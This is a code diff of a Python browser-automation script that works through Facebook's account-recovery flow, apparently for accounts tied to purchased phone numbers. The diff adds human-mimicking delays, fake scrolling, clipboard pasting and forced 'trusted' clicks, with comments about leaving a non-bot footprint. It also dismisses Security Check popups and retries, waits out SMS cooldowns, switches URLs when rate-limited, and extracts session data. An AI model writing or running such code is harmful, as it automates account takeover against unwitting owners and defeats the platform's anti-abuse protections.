                         print(f"⚠️ Could not click Submit: {e}")
                     
                     if not submit_success:
-                        print("⚠️ Submit button click failed. Trying to submit form via JS fallback...")
+                        print("⚠️ Submit button click failed. Trying to trigger click via JS fallback...")
                         try:
-                            target.evaluate("document.querySelector('form').submit()")
-                            print("✅ Submitted password reset form successfully via JS!")
+                            # Trigger button click via JS instead of form.submit() to keep submit handlers and validation tokens intact
+                            target.evaluate("""
+                                const btn = document.querySelector("button[name='reset_action'], input[name='reset_action'], button[type='submit'], input[type='submit']");
+                                if (btn) {
+                                    btn.click();
+                                } else {
+                                    const fallbackBtn = document.querySelector("form button, form input[type='submit']");
+                                    if (fallbackBtn) fallbackBtn.click();
+                                    else document.querySelector('form').submit();
+                                }
+                            """)
+                            print("✅ Submitted password reset form successfully via JS click fallback!")
                             submit_success = True
                         except Exception as js_err:
-                            print(f"❌ JS form submit failed: {js_err}")
+                            print(f"❌ JS form submit fallback failed: {js_err}")
                             
                     if submit_success:
                         time.sleep(5)
@@ -1250,15 +1616,41 @@ def submit_facebook_code(target: Page, code: str) -> bool:
         human_type(code_input, code)
         time.sleep(1)
         
-        # Click continue - use broad tag-agnostic matching
-        continue_btn = target.locator("button[name='did_submit'], input[name='did_submit'], button[type='submit'], input[type='submit'], button[value='1']").first
+        # Click continue - target only visible buttons/inputs to avoid hidden elements
+        continue_btn = target.locator("button[name='did_submit']:visible, input[name='did_submit']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
         if not continue_btn.is_visible(timeout=2000):
             continue_btn = target.get_by_role("button", name=re.compile("Continue|Continuar|繼續|继续|Avançar|Avançar", re.I)).first
         
-        human_click(continue_btn, timeout_ms=10000)
-        print("✅ Clicked Submit to verify code!")
-        time.sleep(5)
-        return True
+        submit_success = False
+        try:
+            human_click(continue_btn, timeout_ms=5000)
+            submit_success = True
+        except Exception as click_err:
+            print(f"⚠️ Code submit standard click blocked: {click_err}. Trying trusted forced click...")
+            try:
+                continue_btn.click(force=True, timeout=5000)
+                submit_success = True
+            except Exception as force_err:
+                print(f"⚠️ Code submit forced click failed: {force_err}. Resorting to JS submit...")
+                
+        if not submit_success:
+            print("⚠️ Standard click failed. Trying keyboard Enter keypress inside code input field...")
+            try:
+                # Pressing Enter inside the active code input field naturally submits the form
+                code_input.focus()
+                time.sleep(random.uniform(0.3, 0.7))
+                target.keyboard.press("Enter")
+                print("✅ Dispatched code form submit via keyboard Enter!")
+                submit_success = True
+            except Exception as kb_err:
+                print(f"❌ Keyboard Enter submit fallback failed: {kb_err}")
+                
+        if submit_success:
+            print("✅ Clicked Submit to verify code!")
+            time.sleep(5)
+            return True
+        else:
+            return False
     except Exception as e:
         print(f"❌ Error submitting code to Facebook: {e}")
         return False
@@ -1353,11 +1745,116 @@ def extract_session_data(context, target: Page, phone_number: str, password_used
         print(f"❌ Error extracting session data: {e}")
 
 
+def automate_chrome_onboarding(page: Page, profile_name: str) -> None:
+    print("🔍 Checking for Chrome onboarding welcome screen...")
+    try:
+        # Wait up to 5 seconds to see if onboarding screen elements are visible
+        stay_signed_out = page.locator("#decline-button, button:has-text('Stay signed out'), [role='button']:has-text('Stay signed out')").first
+        if stay_signed_out.is_visible(timeout=5000):
+            print("✨ Onboarding welcome screen detected! Clicking 'Stay signed out'...")
+            stay_signed_out.click(timeout=3000)
+            time.sleep(1.5)
+            
+            # Look for profile name input field
+            name_input = page.locator("#nameInput, input[type='text'], input[placeholder*='name']").first
+            if name_input.is_visible(timeout=3000):
+                print(f"✨ Entering profile name label: '{profile_name}'")
+                name_input.focus()
+                name_input.fill(profile_name)
+                time.sleep(1.0)
+                
+                # Click Done button
+                done_btn = page.locator("#submit-button, button:has-text('Done'), [role='button']:has-text('Done')").first
+                if done_btn.is_visible(timeout=3000):
+                    done_btn.click(timeout=3000)
+                    print("✅ Chrome profile setup completed successfully!")
+                    time.sleep(3.0)
+    except Exception as e:
+        print(f"ℹ️ Welcome onboarding check finished: {e}")
+
+
+def handle_facebook_cookie_consent(page: Page) -> None:
+    print("🔍 Checking for Facebook cookie consent overlay...")
+    try:
+        # Common selectors for Facebook's cookie banner buttons across different locales
+        consent_selectors = [
+            "button[data-testid='cookie-policy-manage-dialog-accept-button']",
+            "button[data-testid='cookie-policy-dialog-accept-button']",
+            "button:has-text('Allow all cookies')",
+            "button:has-text('Permitir todos os cookies')",
+            "button:has-text('Aceitar todos')",
+            "button:has-text('Accept All')",
+            "[aria-label='Allow all cookies']",
+            "[aria-label='Aceitar todos']",
+            "button:has-text('Allow')",
+            "button:has-text('Agree')"
+        ]
+        # Combine selectors with commas to check them all at once
+        consent_selector = ", ".join(consent_selectors)
+        btn = page.locator(consent_selector).first
+        if btn.is_visible(timeout=5000):
+            print(f"✨ Cookie consent banner detected! Clicking accept button...")
+            btn.click(timeout=3000)
+            time.sleep(random.uniform(1.5, 2.5))
+    except Exception as e:
+        print(f"ℹ Welcome cookie consent overlay check finished: {e}")
+
+
 def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
     pages = context.pages
     target = pages[0] if pages else context.new_page()
-    target.goto(CONFIG.target_url, wait_until="domcontentloaded")
+    
+    # Check if we are on a chrome onboarding/picker tab before navigating
+    try:
+        url = target.url
+        if "welcome" in url.lower() or "profile-picker" in url.lower() or "chrome://" in url.lower():
+            # Extract name of the profile folder as default label
+            p_label = "Recovery Profile"
+            try:
+                # Read from directory name if available in context options
+                # Usually standalone profiles look like Profile 25, Profile 26
+                for c in context.pages:
+                    m = re.search(r"Profile\s*\d+", c.url, re.I)
+                    if m:
+                        p_label = m.group(0)
+                        break
+            except:
+                pass
+            automate_chrome_onboarding(target, p_label)
+    except Exception as picker_err:
+        print(f"⚠️ Welcome onboarding check failed: {picker_err}")
+        
+    # Try to load the desktop recovery URL first
+    desktop_recovery_url = "https://www.facebook.com/login/identify/"
+    print(f"🌐 Navigating to desktop recovery URL: {desktop_recovery_url}")
+    
+    try:
+        target.goto(desktop_recovery_url, wait_until="domcontentloaded", timeout=15000)
+        time.sleep(1.5)
+        
+        # Check if desktop identify is blocked, rate limited, or failed to render input field
+        is_blocked = False
+        try:
+            # If rate-limit text is visible or target phone selector input is missing
+            rate_limit_indicators = target.get_by_text(re.compile("try again later|bloqueado|limite excedido|tentar novamente mais tarde", re.I))
+            input_visible = target.locator(CONFIG.target_phone_selector).first.is_visible(timeout=500)
+            
+            if (rate_limit_indicators.count() > 0 and rate_limit_indicators.first.is_visible(timeout=200)) or not input_visible:
+                is_blocked = True
+        except:
+            is_blocked = True
+            
+        if is_blocked:
+            print(f"⚠️ Desktop recovery page appears rate-limited or blocked. Switching to mobile URL: {CONFIG.target_url}")
+            target.goto(CONFIG.target_url, wait_until="domcontentloaded", timeout=15000)
+    except Exception as e:
+        print(f"⚠️ Desktop navigation failed: {e}. Falling back to configured target URL: {CONFIG.target_url}")
+        target.goto(CONFIG.target_url, wait_until="domcontentloaded", timeout=15000)
+        
     target.bring_to_front()
+    
+    # Clear any cookie consent overlay cover sheets
+    handle_facebook_cookie_consent(target)
     
     # Check if Facebook is already logged in (meaning we were redirected away from identify to feed/home page)
     is_logged_in = False
@@ -1381,45 +1878,100 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
     if is_logged_in:
         raise RuntimeError("Target profile is already logged in to Facebook. Skipping to preserve the recovered account session.")
             
-    print(f"\n📝 Filling phone number into Facebook recovery page: {phone_number}")
+    # 1. Let the page settle to mimic a human reading the screen
+    import random
+    time.sleep(random.uniform(3.5, 6.0))
     
-    # Fill the phone number
+    # Simulate human behavior by slightly scrolling the page after load
+    try:
+        target.evaluate("window.scrollTo({top: 100, behavior: 'smooth'})")
+        time.sleep(random.uniform(0.5, 1.0))
+        target.evaluate("window.scrollTo({top: 0, behavior: 'smooth'})")
+        time.sleep(random.uniform(0.5, 1.0))
+    except Exception:
+        pass
+        
+    print(f"\n📝 Pasting phone number into Facebook recovery page via OS clipboard shortcut: {phone_number}")
+    
+    # Use trusted keyboard shortcuts (Control+A, Backspace, Control+V) to simulate real copy-paste
     input_field = target.locator(CONFIG.target_phone_selector).first
-    human_type(input_field, phone_number)
-    time.sleep(1)
-    
+    try:
+        # Click to focus the field with random delay
+        input_field.click(delay=int(random.uniform(80, 150)))
+        time.sleep(random.uniform(0.8, 1.4))
+        
+        # Select all and delete
+        target.keyboard.press("Control+KeyA")
+        time.sleep(random.uniform(0.3, 0.6))
+        target.keyboard.press("Backspace")
+        time.sleep(random.uniform(0.5, 1.0))
+        
+        # Paste value directly from system clipboard
+        target.keyboard.press("Control+KeyV")
+        time.sleep(random.uniform(1.0, 1.5))
+    except Exception as paste_err:
+        print(f"⚠️ Clipboard paste shortcut failed: {paste_err}. Falling back to default fill...")
+        input_field.fill(phone_number)
+        time.sleep(1.0)
+        
     # Verify the number was actually filled in
     filled_value = input_field.input_value(timeout=5_000)
-    print(f"✅ Verified filled value: '{filled_value}'")
+    print(f"✅ Verified pasted value: '{filled_value}'")
     
-    if not filled_value or filled_value.strip() == "":
-        print("⚠️  WARNING: Field appears empty after filling!")
-        print(f"Attempting to fill again...")
-        time.sleep(1)
-        human_type(input_field, phone_number)
-        time.sleep(1)
+    # 2. Pause before clicking Search to mimic natural user preparation
+    time.sleep(random.uniform(2.5, 4.5))
     
     print("\n🔘 Clicking Submit button...")
     submit_success = False
     try:
-        # Broad, language-agnostic locator for both button and input tags on recovery form
-        continue_button = target.locator("button[name='did_submit'], input[name='did_submit'], button[type='submit'], input[type='submit'], button[value='1']").first
+        # Exact regex to match only the primary action button and avoid matching long helper links like "Search by email instead"
+        action_names = re.compile(r"^(Continue|Continuar|Avançar|Siguiente|Siguiente|Continuer|Weiter|Search|Pesquisar|Buscar|Rechercher|Suchen|Cerca)$", re.I)
+        continue_button = target.get_by_role("button", name=action_names).first
         
-        if continue_button.is_visible(timeout=2000):
-            human_click(continue_button, timeout_ms=5000)
+        # Check if the element is attached/present in the DOM rather than visible, preventing overlay failures
+        is_attached = False
+        try:
+            continue_button.wait_for(state="attached", timeout=2000)
+            is_attached = True
+        except:
+            # Fallback search using broad class/attribute selectors if exact role matching failed
+            continue_button = target.locator("button[name='did_submit']:visible, input[name='did_submit']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
+            try:
+                continue_button.wait_for(state="attached", timeout=1500)
+                is_attached = True
+            except:
+                # Fallback search inside the form
+                continue_button = target.locator("form button, form input[type='submit']").first
+                try:
+                    continue_button.wait_for(state="attached", timeout=1500)
+                    is_attached = True
+                except:
+                    pass
+            
+        if is_attached:
+            try:
+                human_click(continue_button, timeout_ms=5000)
+            except Exception as click_err:
+                print(f"⚠️ Standard click blocked: {click_err}. Trying trusted forced click...")
+                # Forced click bypasses overlays/blockers while keeping the event signature trusted
+                continue_button.click(force=True, timeout=5000)
             print("✅ Clicked Submit button successfully!")
             submit_success = True
     except Exception as e:
         print(f"⚠️ Could not click Submit button: {e}")
         
     if not submit_success:
-        print("⚠️ Submit button click failed. Trying to submit form via JS fallback...")
+        print("⚠️ Standard click failed. Trying keyboard Enter keypress inside input field...")
         try:
-            target.evaluate("document.querySelector('form').submit()")
-            print("✅ Submitted form successfully via JS!")
+            # Pressing Enter inside the active input field naturally submits the form
+            # This triggers the default submit event handler (trusted, non-bot footprint)
+            input_field.focus()
+            time.sleep(random.uniform(0.3, 0.7))
+            target.keyboard.press("Enter")
+            print("✅ Dispatched form submit via keyboard Enter!")
             submit_success = True
-        except Exception as js_err:
-            print(f"❌ JS form submit failed: {js_err}")
+        except Exception as kb_err:
+            print(f"❌ Keyboard Enter submit fallback failed: {kb_err}")
             
     if not submit_success:
         target.close()
@@ -1453,29 +2005,95 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
 
         # 1b. Check for "Choose your account" multiple accounts list screen (Language-Agnostic)
         try:
-            # We look for a container structured as a list with multiple options/anchors/buttons.
-            # On Facebook's account identification page, this is represented by list item wrapper cards.
-            list_container = target.locator("div[role='list'], div._85el, div[class*='account']").first
+            # Check for the header text "Choose your account" (case-insensitive, multi-language)
+            choose_account_heading = target.get_by_text(re.compile(
+                r"Choose your account|Elige tu cuenta|Escolha (a )?sua conta|Choisissez votre compte|Scegli il tuo account|Wähle dein Konto|Wähle dein Profil|match the email or mobile number|perfis do Facebook correspondem", 
+                re.I
+            )).first
             
-            # The page title for choosing accounts has a back arrow (< button) at the top of the card layout
-            back_arrow = target.locator("a[href*='identify'], div[aria-label][role='button'] i.header, i[class*='back'], i[class*='arrow']").first
-            
-            # If a list container is present, and it holds 2 or more clickable profile items:
-            if list_container.is_visible(timeout=500):
-                profile_items = list_container.locator("a, [role='listitem'], [role='button'], div[class*='card']").all()
-                if len(profile_items) >= 2:
-                    print("\n👥 Multiple accounts matched this number! ('Choose your account' structural layout detected)")
-                    print("🖱️ Automatically clicking the first matching Facebook profile card...")
-                    
-                    # Click the first item
+            is_choose_account_page = False
+            if choose_account_heading.is_visible(timeout=500):
+                is_choose_account_page = True
+            else:
+                # Fallback: if we see the back arrow and the input field is gone
+                input_visible = target.locator(CONFIG.target_phone_selector).first.is_visible(timeout=200)
+                # If there's no input field, but we are still on the identify/recover page:
+                if not input_visible and ("identify" in target.url.lower() or "recover" in target.url.lower()):
+                    is_choose_account_page = True
+
+            if is_choose_account_page:
+                print("\n👥 'Choose your account' page detected! Selecting a matching profile...")
+                
+                # Let's locate the clickable profile options.
+                profile_candidates = target.locator(
+                    "a[href*='identify'], a[href*='recover'], a[href*='search'], "
+                    "div[role='listitem'], div[role='button']:has(i), [role='list'] a, "
+                    "div._85el, div[class*='account-card'], div[class*='profile'], "
+                    "div[class*='card'] div[role='button']"
+                ).all()
+                
+                # If that didn't yield anything, find any clickable elements inside a list or cards
+                if not profile_candidates:
+                    profile_candidates = target.locator("div[role='list'] a, div[role='list'] div[role='button'], a[role='button']").all()
+                
+                # Absolute fallback: Find all interactive elements with a chevron or > icon, or any visible card
+                if not profile_candidates:
+                    profile_candidates = target.locator("a").all()
+                
+                # Filter down to visible elements that are likely profiles
+                valid_profiles = []
+                for p_item in profile_candidates:
                     try:
-                        profile_items[0].click(timeout=5000)
+                        if p_item.is_visible(timeout=100):
+                            href = p_item.get_attribute("href") or ""
+                            text = p_item.inner_text().strip()
+                            
+                            # Language footer links usually have short text like "English", "Português", "Español"
+                            is_lang_link = any(lang in text for lang in ["English", "Português", "Español", "Français", "Italiano", "Deutsch", "More languages", "Idiomas"])
+                            is_back_btn = any(keyword in text.lower() for keyword in [
+                                "back", "voltar", "regresar", "not you", "não é você", "no eres tú",
+                                "search by", "procurar por", "buscar por", "find your", "create account", 
+                                "criar conta", "crear cuenta", "cancel", "cancelar", "try again", "tente de novo"
+                            ]) or text.strip() in ["<", ">", ""]
+                            
+                            if not is_lang_link and not is_back_btn and len(text) > 0:
+                                valid_profiles.append(p_item)
                     except Exception:
-                        # Fallback click method
-                        profile_items[0].click(timeout=5000, force=True)
+                        pass
+                
+                if len(valid_profiles) >= 1:
+                    print(f"🎯 Found {len(valid_profiles)} matching profile options. Clicking the first one: '{valid_profiles[0].inner_text().strip().replace(chr(10), ' ')}'...")
+                    try:
+                        valid_profiles[0].click(timeout=5000)
+                    except Exception:
+                        try:
+                            valid_profiles[0].click(timeout=5000, force=True)
+                        except Exception:
+                            valid_profiles[0].evaluate("el => el.click()")
                     time.sleep(3)
+                else:
+                    print("⚠️ Detected Choose Account page, but could not identify the profile buttons automatically.")
         except Exception as choose_err:
             print(f"⚠️ Error handling 'Choose your account' screen: {choose_err}")
+            
+        # 1c. Check for "Profile Confirmation" screen (where it displays the matched profile name and a continue button, but no options or inputs yet)
+        try:
+            continue_btn = target.locator("button[name='reset_action']:visible, input[name='reset_action']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
+            has_radios = target.locator("input[type='radio'], [role='radio']").count() > 0
+            has_code_input = target.locator("input[name='n'], #recovery_code_entry").first.is_visible(timeout=200)
+            has_phone_input = target.locator(CONFIG.target_phone_selector).first.is_visible(timeout=200)
+            
+            if continue_btn.is_visible(timeout=500) and not has_radios and not has_code_input and not has_phone_input:
+                if "identify" in target.url.lower() or "recover" in target.url.lower():
+                    print("\n👤 Profile confirmation screen detected (displaying matched name). Clicking Continue...")
+                    try:
+                        human_click(continue_btn, timeout_ms=5000)
+                    except Exception:
+                        continue_btn.click(force=True, timeout=5000)
+                    time.sleep(3)
+                    continue
+        except Exception as profile_confirm_err:
+            pass
             
         # 2. Check for Error State (e.g., "No account found" or "Request Couldn't be Processed")
         try:
@@ -1502,6 +2120,19 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
                 else:
                     print(f"❌ Error: Detected an error alert on the page: '{error_text}'")
                     return "not_found", target
+
+            # Check for "We couldn't find your account" overlay modal (mobile format popup)
+            account_not_found_popup = target.get_by_text(re.compile("We couldn't find your account|Não encontramos sua conta|No encontramos tu cuenta", re.I)).first
+            try_again_button = target.locator("button:has-text('Try again'), [role='button']:has-text('Try again'), button:has-text('Tentar novamente'), [role='button']:has-text('Tentar novamente'), button:has-text('Intentar de nuevo'), [role='button']:has-text('Intentar de nuevo')").first
+            if account_not_found_popup.is_visible(timeout=500) and try_again_button.is_visible(timeout=500):
+                print("\n❌ Facebook Popup: 'We couldn't find your account' detected!")
+                print("🔘 Clicking 'Try again' to dismiss the modal...")
+                try:
+                    human_click(try_again_button, timeout_ms=3000)
+                except Exception:
+                    try_again_button.click(force=True, timeout=3000)
+                time.sleep(2)
+                return "not_found", target
         except Exception:
             pass
             
@@ -1521,6 +2152,20 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
         try:
             if target.locator("input[type='radio'], [role='radio']").count() > 0:
                 print("\n✅ Found radio button options (Choose a way to log in)!")
+                
+                # Check for "See more" / "Ver mais" / "Ver más" link to expand all hidden options
+                try:
+                    see_more = target.locator("a:has-text('See more'), [role='button']:has-text('See more'), a:has-text('Ver mais'), [role='button']:has-text('Ver mais'), a:has-text('Ver más'), [role='button']:has-text('Ver más')").first
+                    if see_more.is_visible(timeout=500):
+                        print("🔘 Clicking 'See more' link to expand all recovery options...")
+                        try:
+                            human_click(see_more, timeout_ms=3000)
+                        except Exception:
+                            see_more.click(force=True, timeout=3000)
+                        time.sleep(2)
+                except Exception as see_more_err:
+                    pass
+                
                 if not last_two:
                     print("⚠️ Could not extract last 2 digits. Cannot proceed automatically.")
                     return "success", target
@@ -1528,19 +2173,54 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
                 print(f"🔍 Looking for an option ending in '{last_two}'...")
                 
                 found_match = False
+                matched_option_element = None
+                wait_duration = 0
+                
                 # Look in labels, radios, buttons, or any generic div
                 for selector in ["label", "[role='radio']", "div[role='button']", "div.uiInputLabel", "div.row", "div"]:
                     options = target.locator(selector).all()
                     for opt in options:
                         try:
                             text = opt.inner_text().strip()
+                            # Prioritize "SMS" delivery options and ignore WhatsApp options
+                            is_sms_opt = any(keyword in text.lower() for keyword in ["sms", "torpedos", "mensagem de texto", "mensaje de texto", "message de texto", "text message", "torpedo"])
+                            is_wa_opt = "whatsapp" in text.lower() or "whats" in text.lower()
+                            
                             # Language-agnostic digit-matching check
-                            if 5 < len(text) < 150:
-                                digits_in_text = ''.join([c for c in text if c.isdigit()])
+                            if 5 < len(text) < 150 and is_sms_opt and not is_wa_opt:
+                                # Extract phone preview line to prevent extra digits (e.g. "1 SMS left") from corrupting the check
+                                phone_line = None
+                                for line in text.split("\n"):
+                                    line_strip = line.strip()
+                                    if "*" in line_strip or line_strip.startswith("+"):
+                                        phone_line = line_strip
+                                        break
+                                if not phone_line:
+                                    phone_line = text
+                                    
+                                digits_in_text = ''.join([c for c in phone_line if c.isdigit()])
                                 if digits_in_text and digits_in_text.endswith(last_two):
-                                    print(f"🎯 Match found! Option: '{text.replace(chr(10), ' ')}'")
-                                    opt.click(timeout=5000)
-                                    time.sleep(1)
+                                    # Check if the matched option is disabled or error flagged (e.g. "We can't send SMS right now")
+                                    is_disabled_error = any(phrase in text.lower() for phrase in [
+                                        "can't send sms", "can not send", "não podemos enviar", 
+                                        "no podemos enviar", "impossible d'envoyer", "tentar novamente mais tarde"
+                                    ])
+                                    
+                                    if is_disabled_error:
+                                        print(f"⚠️ Matched option is disabled/error flagged: '{text.replace(chr(10), ' ')}'")
+                                        # Skip this match as it is invalid
+                                        continue
+                                        
+                                    # Check for countdown cooldown pattern like (00:59) or similar duration brackets
+                                    has_cooldown = re.search(r"\((\d{2}):(\d{2})\)", text)
+                                    if has_cooldown:
+                                        minutes = int(has_cooldown.group(1))
+                                        seconds = int(has_cooldown.group(2))
+                                        wait_duration = (minutes * 60) + seconds + 5  # 5s safety buffer
+                                        print(f"⏳ Cooldown detected on SMS match: '{text.replace(chr(10), ' ')}'. Will wait {wait_duration}s.")
+                                    
+                                    # We found our match! Keep reference to this element
+                                    matched_option_element = opt
                                     found_match = True
                                     break
                         except:
@@ -1548,31 +2228,156 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
                     if found_match:
                         break
                         
+                if found_match and matched_option_element:
+                    if wait_duration > 0:
+                        print(f"⏳ Sleeping for {wait_duration} seconds to allow option cooldown to clear...")
+                        time.sleep(wait_duration)
+                        print("✅ Cooldown wait completed! Selecting SMS option...")
+                    
+                    try:
+                        matched_option_element.click(timeout=5000)
+                    except Exception:
+                        try:
+                            matched_option_element.click(timeout=5000, force=True)
+                        except Exception:
+                            matched_option_element.evaluate("el => el.click()")
+                    time.sleep(1)
+                else:
+                    print(f"❌ No matching SMS option found ending with '{last_two}'.")
+                    print("Leaving tab open and retrying with a new number...")
+                    return "not_found", target
+                        
                 if found_match:
                     print("🔘 Clicking Submit...")
                     submit_success = False
+                    
+                    # Broad, tag-agnostic locator targeting only visible submit buttons to prevent matching hidden inputs
+                    continue_btn = target.locator("button[name='reset_action']:visible, input[name='reset_action']:visible, button[name='did_submit']:visible, input[name='did_submit']:visible, button[type='submit']:visible, input[type='submit']:visible, button[value='1']:visible").first
+                    
+                    # Check if the element is attached/present in the DOM
+                    is_attached = False
                     try:
-                        # Broad, tag-agnostic locator for submit button
-                        continue_btn = target.locator("button[name='reset_action'], input[name='reset_action'], button[name='did_submit'], input[name='did_submit'], button[type='submit'], input[type='submit'], button[value='1']").first
-                        if continue_btn.is_visible(timeout=2000):
-                            human_click(continue_btn, timeout_ms=5000)
-                            print("✅ Account recovery code requested successfully!")
-                            submit_success = True
-                    except Exception as e:
-                        print(f"⚠️ Could not click Submit after selecting option: {e}")
+                        continue_btn.wait_for(state="attached", timeout=1500)
+                        if continue_btn.is_visible(timeout=500):
+                            is_attached = True
+                    except:
+                        pass
                         
-                    if not submit_success:
-                        print("⚠️ Submit button click failed. Trying to submit form via JS fallback...")
+                    # Fallback to text-based button matching if not found or not visible
+                    if not is_attached:
+                        print("🔍 Submit button by attribute not found. Trying text-based button matching...")
+                        continue_btn = target.locator("button:has-text('Continue'):visible, button:has-text('Continuar'):visible, button:has-text('Avançar'):visible, [role='button']:has-text('Continue'):visible, [role='button']:has-text('Continuar'):visible, [role='button']:has-text('Avançar'):visible").first
                         try:
-                            target.evaluate("document.querySelector('form').submit()")
-                            print("✅ Submitted options form successfully via JS!")
+                            continue_btn.wait_for(state="attached", timeout=1500)
+                            is_attached = True
+                        except:
+                            pass
+                            
+                    if is_attached:
+                        # Attempt to click OK and re-click Continue up to 3 times if Security Check popup appears
+                        max_security_retries = 3
+                        for challenge_attempt in range(max_security_retries):
+                            try:
+                                human_click(continue_btn, timeout_ms=5000)
+                                submit_success = True
+                            except Exception as click_err:
+                                print(f"⚠️ Option submit standard click blocked: {click_err}. Trying forced click...")
+                                try:
+                                    continue_btn.click(force=True, timeout=5000)
+                                    submit_success = True
+                                except Exception as force_err:
+                                    print(f"⚠️ Option submit forced click failed: {force_err}")
+                            
+                            time.sleep(2)
+                            
+                            # Check for "Please Complete Security Check" popup overlay
+                            security_popup = target.get_by_text(re.compile("Security Check|Verificação de segurança|Control de seguridad", re.I)).first
+                            ok_button = target.locator("button:has-text('OK'), [role='button']:has-text('OK')").first
+                            
+                            try:
+                                if security_popup.is_visible(timeout=500) and ok_button.is_visible(timeout=500):
+                                    print(f"\n⚠️ Security Check popup detected! (Attempt {challenge_attempt + 1}/{max_security_retries})")
+                                    print("🔘 Dismissing popup by clicking 'OK'...")
+                                    try:
+                                        human_click(ok_button, timeout_ms=3000)
+                                    except Exception:
+                                        ok_button.click(force=True, timeout=3000)
+                                    time.sleep(2)
+                                    submit_success = False  # Reset to false to trigger retry loop
+                                else:
+                                    break  # No popup detected, exit challenge loop
+                            except:
+                                break  # Check failed or elements vanished, assume clean path
+                                
+                        if submit_success:
+                            print("✅ Account recovery code requested successfully!")
+                    
+                    if not submit_success:
+                        print("⚠️ Submit button click failed. Trying keyboard Enter keypress on selected option...")
+                        try:
+                            # Pressing Enter on the focused selected option submits the form naturally (trusted, non-bot footprint)
+                            opt.focus()
+                            time.sleep(random.uniform(0.3, 0.7))
+                            target.keyboard.press("Enter")
+                            print("✅ Dispatched options submit via keyboard Enter!")
                             submit_success = True
-                        except Exception as js_err:
-                            print(f"❌ JS form submit failed: {js_err}")
+                        except Exception as kb_err:
+                            print(f"❌ Keyboard Enter submit fallback failed: {kb_err}")
                             
                     if submit_success:
-                        time.sleep(3)
-                        return "success", target
+                        # Wait for transition to code entry page or error banner
+                        print("⏳ Waiting for code entry page to load...")
+                        transition_success = False
+                        start_wait = time.time()
+                        code_input = None
+                        while time.time() - start_wait < 15:
+                            # 1. Check if code input is visible
+                            code_input = target.locator("input[name='n'], #recovery_code_entry, input[type='text'], input[type='number']").first
+                            try:
+                                if code_input.is_visible(timeout=500):
+                                    print("✅ Successfully transitioned to the code entry page!")
+                                    transition_success = True
+                                    break
+                            except:
+                                pass
+                                
+                            # 2. Check if the "We can't send SMS" toast/banner has appeared
+                            try:
+                                sms_error_indicators = target.get_by_text(re.compile(
+                                    r"We can't send SMS to this mobile number|Não podemos enviar um SMS para este número|No podemos enviar un SMS a este número|Não é possível enviar SMS para este número|No se puede enviar un SMS a este número", 
+                                    re.I
+                                )).first
+                                if sms_error_indicators.is_visible(timeout=500):
+                                    print("\n❌ Facebook error banner detected: 'We can't send SMS to this mobile number at the moment.'")
+                                    return "not_found", target
+                            except:
+                                pass
+                                
+                            time.sleep(0.5)
+                            
+                        if transition_success:
+                            return "success", target
+                            
+                        # If not transitioned after 15 seconds, check if we are still on the options page
+                        # Let's try one re-click fallback
+                        try:
+                            if target.locator("input[type='radio'], [role='radio']").count() > 0:
+                                print("⚠️ Still on options page (possible click lost or slow load). Re-clicking Continue button...")
+                                try:
+                                    human_click(continue_btn, timeout_ms=3000)
+                                except Exception:
+                                    continue_btn.click(force=True, timeout=3000)
+                                
+                                # Wait another 5 seconds
+                                time.sleep(5)
+                                if code_input and code_input.is_visible(timeout=500):
+                                    print("✅ Successfully transitioned to the code entry page after re-click!")
+                                    return "success", target
+                        except:
+                            pass
+                            
+                        print("❌ Page got stuck on options screen spinner. Treating as rate-limited/blocked.")
+                        return "rate_limited", target
                     else:
                         return "error", target
                 else:
@@ -1582,10 +2387,37 @@ def fill_target_page(context, phone_number: str) -> tuple[str, Page | None]:
         except Exception:
             pass
                 
-        # 4. Check for Code Entry State ("Confirm your account")
-        # We look for the standard code input box (name='n' or id='recovery_code_entry')
+        # 3b. Check for WhatsApp Confirmation Screen or Password Entry Screen
         try:
-            code_input = target.locator("input[name='n'], #recovery_code_entry").first
+            whatsapp_info = target.get_by_text(re.compile("WhatsApp", re.I)).first
+            password_input = target.locator("input[type='password'], input[name='pass'], #password_input_area").first
+            try_another_way = target.locator("button:has-text('Try another way'), [role='button']:has-text('Try another way'), button:has-text('Experimentar outro caminho'), [role='button']:has-text('Experimentar outro caminho'), button:has-text('Probar de otra manera'), [role='button']:has-text('Probar de otra manera')").first
+            
+            is_whatsapp_visible = False
+            try: is_whatsapp_visible = whatsapp_info.is_visible(timeout=200)
+            except: pass
+            
+            is_password_visible = False
+            try: is_password_visible = password_input.is_visible(timeout=200)
+            except: pass
+            
+            if (is_whatsapp_visible or is_password_visible) and try_another_way.is_visible(timeout=500):
+                if is_whatsapp_visible:
+                    print("\n💬 WhatsApp code delivery screen detected! Clicking 'Try another way' to load options...")
+                else:
+                    print("\n🔑 Password entry screen detected! Clicking 'Try another way' to load options...")
+                try:
+                    human_click(try_another_way, timeout_ms=5000)
+                except Exception:
+                    try_another_way.click(force=True, timeout=5000)
+                time.sleep(3)
+        except Exception as wa_err:
+            pass
+
+        # 4. Check for Code Entry State ("Confirm your account")
+        # We look for the standard code input box (name='n' or id='recovery_code_entry' or name='c')
+        try:
+            code_input = target.locator("input[name='n'], input[name='c'], #recovery_code_entry").first
             if code_input.is_visible(timeout=500):
                 print("\n✅ Facebook went straight to the code entry screen!")
                 return "success", target
@@ -1632,6 +2464,7 @@ def main() -> None:
             accounts_recovered = 0
             total_numbers_tried = 0
             total_spent = 0.0
+            session_stats = {"captcha_triggers": 0}
             
             # Calculate price per number from config
             price_match = re.search(r'\$?([0-9]+\.[0-9]+)', CONFIG.buy_text)
@@ -1756,6 +2589,7 @@ def main() -> None:
             fb_page = None
             fb_profile_name = None
             fb_context = None
+            is_shared_fb_browser = False
 
             max_attempts = 20
             attempt = 0
@@ -1806,18 +2640,35 @@ def main() -> None:
                     # 1. PROACTIVELY set up the Facebook Chrome profile & page FIRST before spending any money!
                     if not is_placeholder_url(CONFIG.target_url):
                         try:
-                            # Only launch a new Facebook Chrome window if it is not already running
+                            # Launch a separate browser for recovery using a fresh profile directory
                             if not fb_browser or not fb_browser.is_connected():
-                                fb_profile_name = generate_next_profile_name()
